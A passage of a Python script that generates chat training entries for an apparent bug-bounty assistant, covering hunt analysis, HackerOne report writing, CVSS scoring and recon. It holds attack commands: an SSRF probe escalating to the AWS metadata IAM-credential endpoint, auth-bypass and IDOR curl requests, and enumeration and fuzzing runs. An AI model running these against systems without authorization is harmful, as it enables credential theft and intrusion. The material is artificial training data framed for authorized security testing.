curl -X POST https://target.com/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{"url": "http://YOUR_INTERACT_URL/ssrf-test", "events": ["payment"]}'

# If callback fires: escalate to metadata
curl -X POST https://target.com/api/webhooks \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

**Let the engine continue** — it'll probe the other 3 pending hypotheses automatically. The SSRF probe is most likely running concurrently."""))

entries.append(e("CH-H002", "live_hunt_analysis",
"""hunt has been running for 20 minutes with 0 confirmed findings. here's the live state:

{
  "phase": "hypothesizing",
  "iteration": 8,
  "confirmedFindings": 0,
  "hypotheses": 24,
  "rejectedHypotheses": 24,
  "observations": 12,
  "target": "https://secure-app.com"
}""",
"""**8 iterations, 24 rejected hypotheses, 0 findings — time to pivot.**

**What this tells you:**
The automated probes (nuclei, ffuf, sqlmap patterns) aren't landing. Either the app is well-hardened, the vulnerabilities require more context to find, or they're in areas the engine's tool set doesn't cover (business logic, race conditions, auth bypass via multi-step flows).

**Pivot to manual testing:**

**1. Check what the engine already tried**
```bash
cat context/hunt-live.json | jq '.hypotheses[] | select(.status=="rejected") | .vulnClass' | sort | uniq -c
```
Avoid repeating these — focus on classes it hasn't tried.

**2. Test business logic manually**
- Registration → login → perform sensitive action: check if each step enforces the previous
- Multi-step flows (checkout, password reset, 2FA) are invisible to automated tools
- Rate limiting: does `/login` allow 1000 requests/minute?

**3. Check for authentication bypass patterns the engine misses**
```bash
# Remove auth header entirely on authenticated endpoints
curl https://secure-app.com/api/account/profile  # no auth header

# Try with empty token
curl -H "Authorization: Bearer " https://secure-app.com/api/account

# Try with expired token (keep an old one handy)
```

**4. IDOR via parameter manipulation**
The engine tests known endpoints — manually probe ID fields in request bodies and headers.

**Sometimes the app is clean.** Move to next target if manual testing also yields nothing after 30 more minutes."""))


# ════════════════════════════════════════════════════════════════════════════
# 6. REPORT WRITING ASSISTANCE
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-R001", "report_writing",
"help me write a HackerOne report for an IDOR I found. I can access any user's profile by changing the ID in the API request. The user data includes name, email, phone, home address.",
"""**HackerOne IDOR Report — ready to paste:**

---

**Title:** IDOR in `/api/v1/users/{id}` allows unauthenticated access to any user's PII

**Severity:** High (CVSS 7.5 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Summary:**
The user profile endpoint `/api/v1/users/{id}` fails to enforce authorization checks, allowing any authenticated user to retrieve the complete profile of any other user by supplying their numeric ID. Exposed data includes full name, email address, phone number, and home address.

**Steps to Reproduce:**
1. Log in with a normal user account and obtain your auth token
2. Retrieve your own profile: `GET /api/v1/users/YOUR_ID` with `Authorization: Bearer TOKEN` → confirm your data returned
3. Modify the ID to another user's value: `GET /api/v1/users/TARGET_ID` with the same token
4. Observe that another user's full profile is returned (name, email, phone, address)

**Proof of Concept:**
```bash
# Your account is ID 1337, accessing ID 1338
curl -H "Authorization: Bearer YOUR_TOKEN" \\
  https://target.com/api/v1/users/1338
```
Response:
```json
{"id": 1338, "name": "Jane Doe", "email": "jane@example.com", "phone": "+1555...", "address": "123 Main St..."}
```

**Impact:**
Any authenticated user can enumerate all user accounts and extract PII for the entire user base. This violates user privacy expectations, likely constitutes a data breach under GDPR/CCPA, and enables targeted phishing, identity theft, and social engineering attacks using real customer data.

**Remediation:**
Implement server-side authorization checks that verify the requesting user's ID matches the requested resource ID, or that the requesting user has explicit admin privileges.

---

Attach the curl output screenshot and change the IDs to match your actual test."""))

entries.append(e("CH-R002", "report_writing",
"how do I calculate the CVSS score for an SSRF that lets me hit the AWS metadata endpoint and get IAM credentials?",
"""**CVSS 3.1 calculation for SSRF → AWS metadata IAM credential theft:**

**Vector: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`**
**Score: 9.1 (Critical)**

**Breakdown:**

| Metric | Value | Reasoning |
|---|---|---|
| Attack Vector (AV) | Network (N) | Exploitable remotely via HTTP |
| Attack Complexity (AC) | Low (L) | No special conditions, reliable |
| Privileges Required (PR) | Low (L) | Requires authenticated user account |
| User Interaction (UI) | None (N) | No victim interaction needed |
| Scope (S) | Changed (C) | SSRF crosses from app to AWS infrastructure |
| Confidentiality (C) | High (H) | IAM keys = full AWS access |
| Integrity (I) | High (H) | IAM keys allow writing/deleting resources |
| Availability (A) | None (N) | SSRF itself doesn't cause outage |

**Why Scope=Changed is critical here:**
The app's security boundary is the web application. SSRF breaks out to AWS metadata (a different security domain). Changed scope pushes the base score significantly higher.

**If the SSRF requires no auth at all (PR:N):**
Vector becomes `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` = **10.0 Critical**

**HackerOne severity mapping:**
- 9.0+ = Critical (P1)
- 7.0-8.9 = High (P2)

Use https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator to verify and generate the official vector string for your report."""))


# ════════════════════════════════════════════════════════════════════════════
# 7. RECON METHODOLOGY
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-RC001", "recon_methodology",
"I just started a bug bounty on target.com. What's the first hour of recon look like?",
"""**First-hour recon workflow for target.com:**

**Minutes 0-10 — Passive recon (no requests to target yet)**
```bash
# Subdomain enumeration from passive sources
subfinder -d target.com -o subs-passive.txt -silent
amass enum -passive -d target.com -o subs-amass.txt
cat subs-passive.txt subs-amass.txt | sort -u > all-subs.txt
wc -l all-subs.txt
```

**Minutes 10-25 — Probe what's alive**
```bash
# Resolve and check HTTP status
cat all-subs.txt | httpx -silent -status-code -title -tech-detect -o alive.txt

# Find interesting subdomains
grep -E "(admin|api|dev|staging|test|internal|portal|dashboard|beta)" alive.txt
```

**Minutes 25-40 — Fingerprint the main target**
```bash
whatweb --aggression=3 https://target.com --log-json=whatweb.json
curl -sI https://target.com | grep -iE "(server|x-powered-by|x-framework|cf-ray)"
nmap -sV -p 80,443,8080,8443,3000,8000 target.com
```

**Minutes 40-55 — Directory/endpoint discovery**
```bash
# Run in background — takes time
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,201,301,302,401,403 -o ffuf-root.json -of json &

# Also check JS files for endpoints
curl -s https://target.com | grep -oE 'src="[^"]+\.js"' | head -20
```

**Minutes 55-60 — Review and prioritize**
Look at `alive.txt` for: admin panels, API endpoints, dev/staging sites, anything returning 200 with a title suggesting functionality.

The first hour is all passive + fingerprinting. Active exploitation starts in hour 2."""))

entries.append(e("CH-RC002", "recon_methodology",
"how do I find API endpoints in a React single-page application?",
"""**React SPA API endpoint discovery:**

**1. Browser DevTools — fastest method**
Open Network tab → filter by `Fetch/XHR` → use the app normally (login, navigate, perform actions).
Every API call appears here with full URL, headers, and body.

**2. Extract from JavaScript bundles**
React apps bundle everything into JS files — endpoints are often embedded:
```bash
# Download and search the main bundle
curl -s https://target.com/ | grep -oE 'src="(/static/js/[^"]+)"' | head -5
curl -s https://target.com/static/js/main.chunk.js | grep -oE '"(/api/[^"]+)"' | sort -u

# Better: use JSParser or relative-url-extractor
python3 relative-url-extractor.py https://target.com/static/js/main.chunk.js
```

**3. Source maps (gold mine if exposed)**
Check if `.map` files are accessible:
```bash
curl -I https://target.com/static/js/main.chunk.js.map
```
If 200: download and decompile for full source code with original variable names and endpoint strings.

**4. Subdomain + path brute force against API**
```bash
# Common API path patterns
ffuf -u https://api.target.com/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,401,403
```

**5. GraphQL introspection**
If GraphQL: `curl -X POST /graphql -d '{"query":"{__schema{types{name}}}"}'`

**6. Check the mobile app**
If they have an Android/iOS app, it often hits the same API. Download APK, decompile with jadx, `grep -r "api\." .` for endpoint strings."""))


# ════════════════════════════════════════════════════════════════════════════
# Write output
# ════════════════════════════════════════════════════════════════════════════

OUT.parent.mkdir(parents=True, exist_ok=True)
OUT.write_text(json.dumps(entries, indent=2, ensure_ascii=False))

print(f"\n{'='*60}")
print(f"  Chat training data generated")
print(f"  Output : {OUT}")
print(f"  Entries: {len(entries)}")
print()
cats = {}
for ent in entries:
    cats[ent['category']] = cats.get(ent['category'], 0) + 1
for cat, count in sorted(cats.items()):
    print(f"    {cat:<35} {count:>3}")
print("=" * 60)
